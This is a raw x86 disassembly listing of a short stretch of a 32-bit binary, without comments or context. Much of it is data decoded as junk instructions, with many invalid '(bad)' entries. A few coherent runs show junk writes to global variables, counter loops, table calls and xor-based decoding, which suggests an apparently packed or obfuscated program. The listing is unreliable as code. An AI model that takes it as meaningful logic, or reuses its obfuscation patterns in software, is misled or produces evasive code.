  40484b:	fisttp QWORD PTR [esi+0x7f652044]
  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483b
  40486f:	xchg   esp,eax
  404870:	pop    eax
  404871:	inc    ecx
  404872:	jbe    0x404841
  404874:	dec    edx
  404875:	and    cl,BYTE PTR [ebx-0x76f8c3ef]
  40487b:	pop    esp
  40487c:	lahf   
  40487d:	mov    dl,0x7a
  40487f:	adc    al,0x41
  404881:	sahf   
  404882:	inc    edx
  404883:	inc    esi
  404884:	xor    esi,DWORD PTR [esi-0x4c]
  404887:	pop    esi
  404888:	fimul  WORD PTR [ebx+0x74]
  40488b:	les    eax,FWORD PTR [eax]
  40488d:	cdq    
  40488e:	mov    gs,WORD PTR [edi-0x6367ffb]
  404894:	push   eax
  404895:	aam    0x18
  404897:	or     al,0x90
  404899:	mov    bl,0xaa
  40489b:	sbb    esi,DWORD PTR [esi]
  40489d:	sub    cl,BYTE PTR ds:0xb7e7def9
  4048a3:	add    ah,ch
  4048a5:	lds    ebp,FWORD PTR [edi+0x7938278f]
  4048ab:	xor    ch,BYTE PTR [esp+ebx*4+0x3531bcc9]
  4048b2:	mov    al,ds:0x1338a757
  4048b7:	scas   eax,DWORD PTR es:[edi]
  4048b8:	add    al,0x76
  4048ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048bb:	add    eax,0x80b48780
  4048c0:	inc    eax
  4048c1:	in     al,dx
  4048c2:	push   esp
  4048c3:	xor    dl,ch
  4048c5:	repz cmp BYTE PTR [edx+0x33],ah
  4048c9:	jge    0x4048dc
  4048cb:	call   0xf654:0x399e99bc
  4048d2:	adc    eax,0x4a03dd7b
  4048d7:	cs mov ebp,0xdc77e7ca
  4048dd:	fucom  st(1)
  4048df:	mov    eax,ds:0x213078d7
  4048e4:	mov    al,ds:0xd709cdc8
  4048e9:	fcmovnu st,st(1)
  4048eb:	jae    0x4048c0
  4048ed:	pop    ebx
  4048ee:	mov    al,ds:0x1580067a
  4048f3:	cld    
  4048f4:	xchg   ecx,eax
  4048f5:	push   ebp
  4048f6:	mov    edx,0x9a712b40
  4048fb:	stc    
  4048fc:	push   0x5df17c32
  404901:	sbb    BYTE PTR [ecx+0x342b75d9],0x4
  404908:	add    cl,BYTE PTR [edx-0x6c]
  40490b:	jo     0x404943
  40490d:	mov    bl,0x82
  40490f:	dec    edi
  404910:	inc    ecx
  404911:	hlt    
  404912:	mov    al,0x7f
  404914:	ja     0x4048c1
  404916:	cs (bad) 
  404918:	adc    DWORD PTR [esi],edi
  40491a:	dec    esi
  40491b:	rol    ch,cl
  40491d:	pop    es
  40491e:	jb     0x4048cf
  404920:	jnp    0x404993
  404922:	repz (bad) 
  404924:	mov    DWORD PTR [ebp-0x24],0xf89c85d8
  40492b:	mov    eax,DWORD PTR [ebp-0xc]
  40492e:	sbb    DWORD PTR ds:0x417e59,0x417e51
  404938:	xor    eax,esi
  40493a:	sub    DWORD PTR ds:0x41abde,0x4245ba
  404944:	jmp    0x404abd
  404949:	fst    QWORD PTR [ebx]
  40494b:	cdq    
  40494c:	loope  0x4049a7
  40494e:	jns    0x4049a5
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	addr16 dec edx
  404956:	aad    0x51
  404958:	aaa    
  404959:	fidivr DWORD PTR [edi+0x7e]
  40495c:	jle    0x404938
  40495e:	jg     0x4049de
  404960:	jle    0x404922
  404962:	scas   eax,DWORD PTR es:[edi]
  404963:	jne    0x404945
  404965:	shl    BYTE PTR [eax-0x1827c558],0xf
  40496c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40496e:	or     dh,0x1
  404971:	ins    BYTE PTR es:[edi],dx
  404972:	fisub  WORD PTR [edx-0x50734351]
  404978:	ins    DWORD PTR es:[edi],dx
  404979:	les    ebx,FWORD PTR [ecx+ecx*8+0xacc490c]
  404980:	std    
  404981:	(bad)
  404985:	jnp    0x404982
  404987:	jmp    0x4049a8
  404989:	pushf  
  40498a:	inc    edi
  40498b:	cs push ds
  40498d:	das    
  40498e:	push   cs
  40498f:	rep lods al,BYTE PTR ds:[esi]
  404991:	inc    edx
  404992:	outs   dx,DWORD PTR ds:[esi]
  404993:	addr16 or eax,0x889bae17
  404999:	in     eax,0x4d
  40499b:	mov    ebp,0x849ef755
  4049a0:	mov    esp,0xf6f218fd
  4049a5:	cdq    
  4049a6:	and    BYTE PTR [ebp-0x21],0x50
  4049aa:	outs   dx,DWORD PTR ds:[esi]
  4049ab:	or     eax,0x86856e0b
  4049b0:	jmp    0x39a543a1
  4049b5:	add    ebp,edx
  4049b7:	adc    DWORD PTR ds:0x6fde29aa,0x4b
  4049be:	mov    eax,ds:0xf45f221d
  4049c3:	push   esp
  4049c4:	sahf   
  4049c5:	loopne 0x404a14
  4049c7:	lock adc bl,BYTE PTR ds:0xfba4ee8a
  4049ce:	mov    ds:0x3f0e3af,al
  4049d3:	sub    eax,edi
  4049d5:	(bad)  [edi]
  4049d7:	sti    
  4049d8:	jae    0x40498f
  4049da:	pusha  
  4049db:	jno    0x404a26
  4049dd:	mov    dh,0x75
  4049df:	ficom  WORD PTR [edx]
  4049e1:	cmp    bh,al
  4049e3:	mov    edi,0xbdfe8c36
  4049e8:	push   DWORD PTR [ebx]
  4049ea:	adc    ebp,DWORD PTR [edx+0xe]
  4049ed:	test   al,0xf8
  4049ef:	mov    al,0x41
  4049f1:	(bad)  
  4049f3:	and    BYTE PTR [ecx],0xd6
  4049f6:	das    
  4049f7:	dec    esi
  4049f8:	or     esp,edx
  4049fa:	neg    BYTE PTR [eax+0x67ed6cf1]
  404a00:	or     dl,BYTE PTR [edi-0x5e]
  404a03:	push   ss
  404a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a05:	pop    ds
  404a06:	out    0xa4,al
  404a08:	mov    esi,0x3cef7f5
  404a0d:	push   ebx
  404a0e:	loop   0x404a18
  404a10:	push   cs
  404a11:	lds    ecx,FWORD PTR [edi-0x7e8034f3]
  404a17:	push   ebp
  404a18:	retf   
  404a19:	out    dx,al
  404a1a:	sub    ah,BYTE PTR [edx-0xf]
  404a1d:	cmp    ecx,DWORD PTR [edi+0x73770d58]
  404a23:	or     al,0x16
  404a25:	or     ch,BYTE PTR [ebp+0x30]
  404a28:	xchg   cl,dl
  404a2a:	jmp    0x6510fb27
  404a2f:	adc    BYTE PTR [ebp+0x7a],ah
  404a32:	fnsave [eax-0x7b]
  404a35:	(bad)  
  404a36:	(bad)  
  404a37:	(bad)  
  404a38:	je     0x404a39
  404a3a:	rcr    DWORD PTR ds:0xccb663cd,0x57
  404a41:	mov    WORD PTR [ebx+0x13e218d1],ss
  404a47:	div    DWORD PTR [ebx]
  404a49:	loopne 0x404ac5
  404a4b:	repz loope 0x404aac
  404a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a4f:	ss cs jecxz 0x404a30
  404a53:	imul   ecx,edi,0xe342d36
  404a59:	adc    eax,0x3bb77595
  404a5e:	call   0xfd27eda0
  404a63:	(bad)  [eax-0x278126f1]
  404a69:	jmp    0x8db361b5
  404a6e:	sub    dh,dh
  404a70:	mov    esp,0x1ec4fe10
  404a75:	pop    eax
  404a76:	pop    edi
  404a77:	cdq    
  404a78:	out    dx,eax
  404a79:	jge    0x404a65
  404a7b:	sbb    ecx,DWORD PTR [eax]
  404a7d:	fwait
  404a7e:	in     eax,0x93
  404a80:	(bad)  
  404a81:	fsub   QWORD PTR [ebp-0x62]
  404a84:	push   eax
  404a85:	mov    esp,0xab237f7
  404a8a:	arpl   ax,cx
  404a8c:	je     0x404abf
  404a8e:	(bad)  
  404a8f:	data16 sahf 
  404a91:	ret    
  404a92:	daa    
  404a93:	push   0x26338ed0
  404a98:	std    
  404a99:	inc    edi
  404a9a:	hlt    
  404a9b:	sub    BYTE PTR [eax+esi*2],0xb1
  404a9f:	xchg   dl,ah
  404aa1:	push   0x5ff5c554
  404aa6:	xchg   al,ah
  404aa8:	not    DWORD PTR [ebx+0x55]
  404aab:	jl     0x404a6b
  404aad:	mov    edx,0xd4d4bc99
  404ab2:	mov    ah,0x51
  404ab4:	retf   
  404ab5:	inc    esi
  404ab6:	ret    
  404ab7:	out    dx,al
  404ab8:	retf   
  404ab9:	pop    es
  404aba:	outs   dx,DWORD PTR ds:[esi]
  404abb:	hlt    
  404abc:	mov    dl,0x3
  404abe:	(bad)  
  404abf:	mov    DWORD PTR [ebp-0x18],eax
  404ac2:	and    DWORD PTR ds:0x4245ba,0x0
  404acc:	jmp    0x404adc
  404ad1:	mov    eax,ds:0x4245ba
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4245ba,eax
  404adc:	cmp    DWORD PTR ds:0x4245ba,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4245ba,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ae97
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4245ba,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4245ba
  404b13:	inc    eax
  404b14:	mov    ds:0x4245ba,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415111,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417e59,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415115,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41abde,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4245be,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4245b2,0x41abce
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41abda,0x41237c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4245be,0x41abe2
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	aaa    
  404ba5:	in     eax,dx
  404ba6:	mov    dh,0xf6
  404ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ba9:	jl     0x404c29
  404bab:	jle    0x404b87
  404bad:	jg     0x404c2d
  404baf:	jle    0x404bbb
  404bb1:	add    DWORD PTR [esi+ebx*1-0x52b400db],0xffffffee
  404bb9:	or     eax,0xe8a186f5
  404bbe:	ja     0x404bc6
  404bc0:	add    bh,BYTE PTR [esp+eiz*4+0x20db64bb]
  404bc7:	sar    DWORD PTR [ebp+eax*1-0x553284eb],cl
  404bce:	dec    esp
  404bcf:	xor    bh,BYTE PTR [edi]
  404bd1:	dec    ebp
  404bd2:	enter  0xdb72,0xc
  404bd6:	pop    esi
  404bd7:	adc    al,0xc8
  404bd9:	jp     0x404bff
  404bdb:	leave  
  404bdc:	out    0x7a,al
  404bde:	cwde   
  404bdf:	aaa    
  404be0:	cvtpi2ps xmm4,QWORD PTR ds:0xbea0e130
  404be7:	xor    ah,bl
  404be9:	jl     0x404b92
  404beb:	and    BYTE PTR [esp+esi*2],ah
  404bee:	cmp    DWORD PTR [edx],esp
  404bf0:	xchg   esi,eax
  404bf1:	sbb    eax,0x9afc51d4
  404bf6:	pop    esp
  404bf7:	push   ecx
  404bf8:	fdiv   QWORD PTR gs:[eax-0x1c]
  404bfc:	retf   
  404bfd:	mov    eax,ds:0x72a1b244
  404c02:	rol    BYTE PTR [edx+0x202fca68],cl
  404c08:	cs cmc 
  404c0a:	push   edx
  404c0b:	in     eax,0x57
  404c0d:	jp     0x404c4c
  404c0f:	push   ebx
  404c10:	adc    BYTE PTR [eax+0x10dfba39],bh
  404c16:	arpl   WORD PTR [eax],ax
  404c18:	and    DWORD PTR [ebp+0x7a],edi
  404c1b:	loope  0x404bf1
  404c1d:	xor    al,0x91
  404c1f:	pop    eax
  404c20:	inc    edi
  404c21:	mov    ch,0x7a
  404c23:	sahf   
  404c24:	and    al,0xdd
  404c26:	mov    ebx,0x584e4620
  404c2b:	push   0x7e
  404c2d:	out    0x44,eax
  404c2f:	and    eax,0xa25170c8
  404c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c35:	add    bh,BYTE PTR [eax+0x34]
  404c38:	cwde   
  404c39:	mov    ebx,0x5adcc16e
  404c3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c3f:	jno    0x404c20
  404c41:	dec    DWORD PTR [esi-0x778372af]
  404c47:	or     DWORD PTR [edx],0x713e94b7
  404c4d:	or     BYTE PTR [ebx+0x14],dl
  404c50:	xor    esi,DWORD PTR [ebp+0x1e]
  404c53:	add    eax,0xa873259e
  404c58:	sbb    BYTE PTR [eax+0x70],cl
  404c5b:	outs   dx,BYTE PTR ds:[esi]
  404c5c:	sbb    bh,BYTE PTR [ecx+0x26]
  404c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c60:	loop   0x404c97
  404c62:	clc    
  404c63:	nop
  404c64:	xor    BYTE PTR [ebx],0x32
  404c67:	call   0xb050f83
  404c6c:	inc    edx
  404c6d:	xchg   edx,eax
  404c6e:	icebp  
  404c6f:	mov    dl,BYTE PTR [edi-0x3b5bc54]
  404c75:	icebp  
  404c76:	inc    eax
  404c77:	add    al,0xfe
  404c79:	test   al,0xe6
  404c7b:	xchg   ecx,eax
  404c7c:	(bad)  
  404c7d:	scas   eax,DWORD PTR es:[edi]
  404c7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c7f:	mov    dl,dl
  404c81:	test   eax,0xfc323d53
  404c86:	inc    edx
  404c87:	in     al,dx
  404c88:	jp     0x404cef
  404c8a:	je     0x404c9b
  404c8c:	xor    al,BYTE PTR [edx+0x7e]
  404c8f:	scas   al,BYTE PTR es:[edi]
  404c90:	stc    
  404c91:	push   esi
  404c92:	ds add al,bh
  404c95:	ins    DWORD PTR es:[edi],dx
  404c96:	lods   eax,DWORD PTR ds:[esi]
  404c97:	(bad)  
  404c98:	js     0x404c33
  404c9a:	arpl   WORD PTR [esi-0x10780f2],bp
  404ca0:	je     0x404c24
  404ca2:	bound  edi,QWORD PTR [ebp+0x24]
  404ca5:	fidivr DWORD PTR [edi+0x47c39260]
  404cab:	mov    dl,0x92
  404cad:	out    0x4,al
  404caf:	mov    cl,0x62
  404cb1:	retf   0x884
  404cb4:	in     al,dx
  404cb5:	xchg   dl,dh
  404cb7:	mov    es,edi
  404cb9:	out    0xe,eax
  404cbb:	mov    ecx,0xd68cf732
  404cc0:	dec    edx
  404cc1:	xor    cl,BYTE PTR [edi]
  404cc3:	cld    
  404cc4:	icebp  
  404cc5:	xor    al,0x20
  404cc7:	dec    DWORD PTR [ebx]
  404cc9:	(bad)  
  404cca:	aam    0x4e
  404ccc:	jnp    0x404cad
  404cce:	mov    ebx,0x6999fc39
  404cd3:	scas   eax,DWORD PTR es:[edi]
  404cd4:	dec    ebx
  404cd5:	and    DWORD PTR [ebx],ebp
  404cd7:	or     al,0xd1
  404cd9:	popa   
  404cda:	shl    eax,0xfc
  404cdd:	test   al,0xbd
  404cdf:	sub    DWORD PTR [eax+0x5c],0xffffff86
  404ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ce4:	add    ebp,esp
  404ce6:	js     0x404d07
  404ce8:	jo     0x404d48
  404cea:	aam    0x85
  404cec:	dec    ecx
  404ced:	add    DWORD PTR [ecx],ebp
  404cef:	jae    0x404d13
  404cf1:	fsubr  st,st(7)
  404cf3:	adc    eax,0xb9dec7de
  404cf8:	retf   0x2376
  404cfb:	data16 fidivr WORD PTR [eax-0x1a]
  404cff:	xor    eax,ebx
  404d01:	setae  BYTE PTR [eax]
  404d04:	add    ah,cl
  404d06:	lods   al,BYTE PTR ds:[esi]
  404d07:	add    BYTE PTR [ecx+esi*2-0x47],ah
  404d0b:	inc    edx
  404d0c:	xor    eax,esi
  404d0e:	neg    DWORD PTR ds:0x415105
  404d14:	add    eax,edi
  404d16:	xor    DWORD PTR ds:0x412364,0x39b1
  404d20:	push   eax
  404d21:	lea    eax,[ebp-0x78]
  404d24:	push   eax
  404d25:	mov    DWORD PTR ds:0x41237c,0x6752
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415111,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4245b6,0x412364
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415119
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4245b6,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417e59,0x4245ca
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4245be
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4245ca
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417e59,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417e3d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41abd2,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417e55,0x41236c
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417e55,0x417e3d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41abd6,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x412368,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x412364
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404e90
  404e15:	imul   edx,DWORD PTR [esi],0xffffffc5
  404e18:	add    dh,BYTE PTR [edx+0x7e]
  404e1b:	jle    0x404df7
  404e1d:	jg     0x404e9d
  404e1f:	jle    0x404dea
  404e21:	sbb    al,BYTE PTR ds:0xa095a484
  404e27:	cmp    eax,0x8f8473d6
  404e2c:	(bad)  
  404e2d:	fisubr WORD PTR [ebx+0x65]
  404e30:	mov    esi,0xc0dccc1d
  404e35:	pop    ecx
  404e36:	xchg   edx,eax
  404e37:	into   
  404e38:	test   eax,0x7e542176
  404e3d:	dec    ebx
  404e3e:	cwde   
  404e3f:	sub    DWORD PTR ds:0x98b8d9bd,eax
  404e45:	int3   
  404e46:	fcmovu st,st(4)
  404e48:	push   ss
  404e49:	jno    0x404e28
  404e4b:	add    bh,al
  404e4d:	aaa    
  404e4e:	push   edi
  404e4f:	into   
  404e50:	xor    DWORD PTR [esi+0x74],0x10d66d54
  404e57:	sub    DWORD PTR [ebp+0x1cd3d818],ebp
  404e5d:	push   0x29542af4
  404e62:	push   ecx
  404e63:	xor    BYTE PTR [ecx-0x379e1bb2],bl
  404e69:	lock mov ds:0x1fafaecc,al
  404e6f:	or     dl,0x48
  404e72:	cmp    al,0x92
  404e74:	(bad)  
  404e75:	jbe    0x404e89
  404e77:	xchg   esi,eax
  404e78:	inc    ebx
  404e79:	es xor al,0x65
  404e7c:	and    eax,0x843addbf
  404e81:	ss ins DWORD PTR es:[edi],dx
  404e83:	jnp    0x404eac
  404e85:	out    dx,al
  404e86:	lods   al,BYTE PTR ds:[esi]
  404e87:	adc    BYTE PTR [esi+0x4a],dh
  404e8a:	repnz test BYTE PTR gs:[ecx],bh
  404e8e:	les    esi,FWORD PTR [edi]
  404e90:	(bad)  
  404e92:	sar    eax,1
  404e94:	mov    dl,0xac
  404e96:	xor    BYTE PTR [ebx-0x68e4833f],ah
  404e9c:	out    0xa,al
  404e9e:	jno    0x404ed9
  404ea0:	pop    ds
  404ea1:	clc    
  404ea2:	xlat   BYTE PTR ds:[ebx]
  404ea3:	add    edx,DWORD PTR [ecx-0x15]
  404ea6:	aaa    
  404ea7:	push   ss
  404ea8:	jbe    0x404e4a
  404eaa:	lea    esp,[edx+0x11cd4c6d]
  404eb0:	xchg   ebp,eax
  404eb1:	pusha  
  404eb2:	push   ebx
  404eb3:	pop    ds
  404eb4:	inc    ebp
  404eb5:	cmp    al,0xc4
  404eb7:	daa    
  404eb8:	or     DWORD PTR [edi],esi
  404eba:	loope  0x404e7f
  404ebc:	pop    ebp
  404ebd:	pusha  
  404ebe:	test   al,0xfc
  404ec0:	test   cl,dh
  404ec2:	nop
  404ec3:	xor    eax,0xb1ec7f0
  404ec8:	or     edi,edx
  404eca:	cmp    ebp,esp
  404ecc:	neg    cl
  404ece:	jb     0x404e52
  404ed0:	xor    DWORD PTR [esi+eax*8-0x5f],edx
  404ed4:	mov    edi,0x9075fa31
  404ed9:	cdq    
  404eda:	(bad)  
  404edb:	rcr    BYTE PTR [ebp-0x239fd5da],1
  404ee1:	push   esp
  404ee2:	push   ss
  404ee3:	out    0xa4,al
  404ee5:	outs   dx,BYTE PTR ds:[esi]
  404ee6:	or     al,BYTE PTR [ebp+0x72]
  404ee9:	lea    esi,[esi+0x79]
  404eec:	popf   
  404eed:	sbb    eax,0x1a1e7a9c
  404ef2:	mov    bh,0x3
  404ef4:	fld    QWORD PTR [eax]
  404ef6:	or     eax,0xa3b18fb8
  404efb:	mul    BYTE PTR [ecx-0x1d8d31bb]
  404f01:	jb     0x404f7b
  404f03:	inc    eax
  404f04:	add    DWORD PTR [ecx+eax*2+0x41],edi
  404f08:	(bad)  
  404f0a:	pop    eax
  404f0b:	test   al,0x2d
  404f0d:	pop    edx
  404f0e:	icebp  
  404f0f:	adc    esi,DWORD PTR [ebx-0x56]
  404f12:	ror    DWORD PTR [ebp+ebx*4-0x61c8d40f],cl
  404f19:	mov    es,WORD PTR [edx+edi*8-0x5d]
  404f1d:	in     eax,0xe3
  404f1f:	dec    edi
  404f20:	sub    BYTE PTR [ebp-0xd38d3e9],ch
  404f26:	dec    eax
  404f27:	mov    al,ds:0xe247c0c
  404f2c:	jo     0x404ef8
  404f2e:	push   edx
  404f2f:	in     al,0x4a
  404f31:	jnp    0x404eb9
  404f33:	sahf   
  404f34:	clc    
  404f35:	int    0xea
  404f37:	aad    0xaa
  404f39:	xchg   ecx,eax
  404f3a:	cs popf 
  404f3c:	push   cs
  404f3d:	sub    dl,BYTE PTR [ebx]
  404f3f:	mov    dh,0xb2
  404f41:	(bad)  
  404f42:	in     eax,dx
  404f43:	sbb    DWORD PTR [edx],ebp
  404f45:	cmp    DWORD PTR [edx-0x4a4f80b4],edi
  404f4b:	mov    eax,ds:0x824ef12b
  404f50:	scas   eax,DWORD PTR es:[edi]
  404f51:	mov    esi,0x2f7f36ac
  404f56:	pushf  
  404f57:	add    al,0xc3
  404f59:	(bad)  
  404f5b:	test   DWORD PTR [ecx],edx
  404f5d:	sub    ebx,DWORD PTR [ecx]
  404f5f:	adc    bh,BYTE PTR [ebp-0x5257c567]
  404f65:	adc    cl,dl
  404f67:	add    ax,0x4c15
  404f6b:	add    ah,cl
  404f6d:	in     eax,0x5d
  404f6f:	push   ebp
  404f70:	fs call 0xd9e9:0x66ebcb42
  404f78:	(bad)  
  404f79:	cmp    ch,BYTE PTR [edi+0x3e]
  404f7c:	push   eax
  404f7d:	and    DWORD PTR ds:0x4245ae,0x0
  404f87:	jmp    0x404f97
  404f8c:	mov    eax,ds:0x4245ae
  404f91:	inc    eax
  404f92:	mov    ds:0x4245ae,eax
  404f97:	cmp    DWORD PTR ds:0x4245ae,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4245ae,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x412354,0x412370
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415115,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx+0x4158918e],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x404f8a
  404ff9:	mov    eax,ds:0xb3cc106d
  404ffe:	fimul  DWORD PTR [edx]
  405000:	inc    BYTE PTR [eax-0x78b8c97f]
  405006:	out    dx,eax
  405007:	cmp    eax,0xe09eb133
  40500c:	pop    ecx
  40500d:	jo     0x40505c
  40500f:	xor    ch,BYTE PTR [esi]
  405011:	and    ch,BYTE PTR [eax+0x12]
  405014:	jne    0x404ff3
  405016:	cli    
  405017:	ds aas 
  405019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40501a:	in     al,dx
  40501b:	in     eax,0x2
  40501d:	pop    edi
  40501e:	xchg   edx,eax
  40501f:	mov    al,ah
  405021:	js     0x404fc3
  405023:	lea    ebx,[esi+edi*8+0x19262b3e]
  40502a:	sbb    eax,0x2e497466
  40502f:	mov    ebp,0xdae72ba
  405034:	test   al,0x8c
  405036:	cmp    DWORD PTR [esi],ebx
  405038:	jle    0x405040
  40503a:	cmp    DWORD PTR [esi],esp
  40503c:	aaa    
  40503d:	loope  0x405023
  40503f:	popf   
  405040:	mov    dl,0x90
  405042:	lea    ebx,[ebx+0x3b]
  405045:	mov    ah,0x26
  405047:	adc    dh,dl
  405049:	lds    eax,FWORD PTR [ecx+0x52]
  40504c:	out    0xde,eax
  40504e:	arpl   WORD PTR [esi-0x405ddf69],cx
  405054:	bound  eax,QWORD PTR [ebp-0x74]
  405057:	retf   
  405058:	inc    esp
  405059:	mov    eax,ds:0xdb406905
  40505e:	mov    al,ds:0x79a7fb21
  405063:	pop    edx
  405064:	add    al,0x37
  405066:	adc    esi,DWORD PTR [edx]
  405068:	rol    BYTE PTR [edi+0x14e4b0f5],1
  40506e:	mov    WORD PTR [ebp+0x3c3324e3],fs
  405074:	and    BYTE PTR [edx+0x63],bl
  405077:	pop    esp
  405078:	cmp    ch,bh
  40507a:	ss cmp al,0xf4
  40507d:	call   0x59243edf
  405082:	out    0x4a,al
  405084:	sub    ah,BYTE PTR [eax+0x17e4219c]
  40508a:	dec    ecx
  40508b:	sbb    esp,DWORD PTR [ecx]
  40508d:	cwde   
  40508e:	sub    eax,edi
  405090:	mov    WORD PTR [edi+0x75a39bb5],?
  405096:	xchg   edi,eax
  405097:	adc    al,0xa8
  405099:	xchg   edx,eax
  40509a:	imul   BYTE PTR [ecx+eax*8+0x42c826a4]
  4050a1:	or     esp,DWORD PTR [edi-0xf]
  4050a4:	cmp    eax,DWORD PTR [eax+0x18fe0c11]
  4050aa:	cmp    dl,BYTE PTR [ecx+ecx*8-0x1e]
  4050ae:	sbb    eax,0x80e35072
  4050b3:	ja     0x4050a3
  4050b5:	xchg   esi,eax
  4050b6:	mov    ebp,0x900acf95
  4050bb:	jbe    0x4050a5
  4050bd:	cdq    
  4050be:	cdq    
  4050bf:	xchg   esi,eax
  4050c0:	in     al,dx
  4050c1:	xchg   edx,eax
  4050c2:	call   0x64f4:0x3ce863b3
  4050c9:	(bad)  
  4050ca:	jp     0x405125
  4050cc:	xchg   ebx,eax
  4050cd:	loope  0x405094
  4050cf:	jecxz  0x40512c
  4050d1:	das    
  4050d2:	lahf   
  4050d3:	pop    ebx
  4050d4:	fbstp  TBYTE PTR [ebp-0x35]
  4050d7:	pop    ecx
  4050d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050da:	adc    DWORD PTR [edi+0x77],eax
  4050dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050de:	jns    0x405080
  4050e0:	inc    esp
  4050e1:	inc    ebp
  4050e2:	shl    DWORD PTR [ecx],1
  4050e4:	lahf   
  4050e5:	cwde   
  4050e6:	dec    ecx
  4050e7:	pushf  
  4050e8:	or     BYTE PTR [ebx*4-0x1a2aa341],cl
  4050ef:	(bad)  
